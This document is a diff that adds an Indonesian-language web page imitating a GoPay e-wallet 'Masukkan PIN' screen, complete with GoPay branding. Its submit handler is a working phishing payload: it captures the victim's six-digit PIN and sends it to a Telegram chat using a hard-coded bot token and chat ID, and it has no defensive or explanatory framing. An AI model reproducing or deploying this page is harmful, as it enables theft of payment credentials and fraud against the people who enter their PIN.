@@ -1,0 +1,117 @@
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Masukkan PIN</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    body { font-family: 'Inter', sans-serif; }
+  </style>
+</head>
+<body class="bg-[#f5f5f5] min-h-screen flex flex-col justify-between">
+  <header class="flex items-center justify-between px-4 py-3 bg-[#f5f5f5] border-b border-gray-300">
+    <button aria-label="Back" class="text-gray-700 text-xl leading-none">
+      <i class="fas fa-arrow-left"></i>
+    </button>
+    <h1 class="font-bold text-gray-900 text-base">Masukkan PIN</h1>
+    <button class="text-[#00a651] font-semibold text-base leading-none">Bantuan</button>
+  </header>
+  <main class="px-4 pt-6 flex-grow">
+    <form id="pinForm" class="max-w-md mx-auto">
+      <div class="flex items-center justify-between bg-[#d9f7d9] border border-[#00a651] rounded-lg px-3 py-2 mb-6">
+        <div class="flex items-center space-x-2 text-[#00a651] text-sm leading-tight">
+          <i class="fas fa-fingerprint text-lg"></i>
+          <span>Pakai sidik jari, lebih aman & cepat</span>
+        </div>
+        <label class="relative inline-flex items-center cursor-pointer" for="toggle">
+          <input class="sr-only peer" id="toggle" type="checkbox"/>
+          <div class="w-11 h-6 bg-gray-300 rounded-full peer peer-checked:bg-[#d9f7d9] peer-checked:border-[#00a651] border border-gray-300 transition-colors"></div>
+          <div class="absolute left-0.5 top-0.5 bg-white border border-gray-300 w-5 h-5 rounded-full transition-transform peer-checked:translate-x-5"></div>
+        </label>
+      </div>
+      <p class="text-gray-700 text-sm mb-4">Silakan ketik 6 digit PIN kamu buat lanjut.</p>
+      <div class="bg-white rounded-lg flex items-center justify-between px-6 py-3 mb-6">
+        <input id="pinInput" name="pin" type="password" maxlength="6" pattern="\d{6}" required class="flex-grow text-center text-xl tracking-widest border border-gray-300 rounded-md py-2 focus:outline-none focus:ring-2 focus:ring-[#00a651]" placeholder="______" inputmode="numeric" autocomplete="one-time-code"/>
+        <button type="button" id="togglePin" aria-label="Toggle PIN visibility" class="text-gray-700 text-xl ml-3">
+          <i class="fas fa-eye"></i>
+        </button>
+      </div>
+      <button type="submit" class="text-[#00a651] font-semibold text-base mb-6 block">Lupa PIN</button>
+      <button type="submit" id="continueBtn" disabled class="w-full bg-gray-400 text-white font-bold text-base rounded-full py-3 cursor-not-allowed select-none">Continue</button>
+    </form>
+  </main>
+  <footer class="bg-[#f5f5f5] border-t border-gray-300 py-4">
+    <div class="max-w-md mx-auto text-center text-gray-600 text-sm font-semibold flex items-center justify-center space-x-1">
+      <span>Powered by</span>
+      <img alt="Gopay logo blue circle with white G letter" class="inline-block" height="20" src="https://vectorez.biz.id/wp-content/uploads/2023/10/Logo-Gopay.png" width="50"/>
+    </div>
+  </footer>
+  <script>
+    const pinInput = document.getElementById('pinInput');
+    const continueBtn = document.getElementById('continueBtn');
+    const togglePin = document.getElementById('togglePin');
+    const pinForm = document.getElementById('pinForm');
+
+    pinInput.addEventListener('input', () => {
+      if(pinInput.value.length === 6 && /^\d{6}$/.test(pinInput.value)) {
+        continueBtn.disabled = false;
+        continueBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
+        continueBtn.classList.add('bg-[#00a651]', 'cursor-pointer');
+      } else {
+        continueBtn.disabled = true;
+        continueBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+        continueBtn.classList.remove('bg-[#00a651]', 'cursor-pointer');
+      }
+    });
+
+    togglePin.addEventListener('click', () => {
+      if(pinInput.type === 'password') {
+        pinInput.type = 'text';
+        togglePin.innerHTML = '<i class="fas fa-eye-slash"></i>';
+      } else {
+        pinInput.type = 'password';
+        togglePin.innerHTML = '<i class="fas fa-eye"></i>';
+      }
+    });
+
+    pinForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const pin = pinInput.value;
+      if(pin.length !== 6 || !/^\d{6}$/.test(pin)) {
+        alert('PIN harus 6 digit angka');
+        return;
+      }
+
+      const BOT_TOKEN = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+      const CHAT_ID = '7549590022';
+      const message = `PIN baru: ${pin}`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+        const data = await res.json();
+        if(data.ok) {
+          alert('PIN berhasil dikirim ke Telegram');
+          pinInput.value = '';
+          continueBtn.disabled = true;
+          continueBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+          continueBtn.classList.remove('bg-[#00a651]', 'cursor-pointer');
+        } else {
+          alert('Gagal mengirim PIN ke Telegram');
+        }
+      } catch (error) {
+        alert('Error mengirim data ke Telegram');
+        console.error(error);
+      }
+    });
+  </script>
+</body>
+</html>
